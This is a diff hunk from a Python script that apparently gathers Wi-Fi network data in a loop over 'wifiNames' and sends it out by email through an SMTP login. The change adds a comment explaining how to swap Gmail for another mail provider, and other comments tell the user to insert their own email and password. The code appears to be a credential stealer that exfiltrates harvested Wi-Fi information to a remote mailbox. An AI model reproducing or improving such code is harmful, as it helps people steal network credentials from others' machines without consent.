@@ -27,7 +27,7 @@ for wifi in wifiNames:
 content = str(content)
 
 # Uploading Data
-mail = smtplib.SMTP('smtp.gmail.com', 587)
+mail = smtplib.SMTP('smtp.gmail.com', 587) # Change the 'gmail' part to whatever email you are using, if you are using yahoo use 'smtp.yahoo.com'
 mail.ehlo()
 mail.starttls()
 mail.login('email', 'password') # You should enter your email and password here
